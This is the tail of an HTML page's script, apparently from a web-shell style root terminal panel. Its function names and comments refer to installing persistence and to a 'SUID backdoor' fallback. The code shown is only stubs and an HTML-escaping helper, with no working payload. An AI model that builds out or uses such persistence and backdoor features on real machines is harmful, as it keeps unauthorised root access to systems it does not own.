// Handle persistence installation from terminal (redirect to main persist function)
async function installQuickPersist() {
    const output = document.getElementById('rootTerminalOutput');
    output.innerHTML += '<span style="color:#6cf;"># Redirecting to full persistence installer...</span>\n';
    output.innerHTML += '<span style="color:#ff0;"># Please click the 🔒 Persist button in the button row above.</span>\n';
    updateTerminalStatus('⚠️ Click 🔒 Persist button above', '#f80');
}

// Get exploit wrapper command (fallback jika tidak ada SUID backdoor)
async function getExploitWrapperCmd(cmd) {
    // Untuk sekarang return command biasa dengan warning
    return cmd;
}

// Escape HTML helper
function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
</script>
</body>
</html>
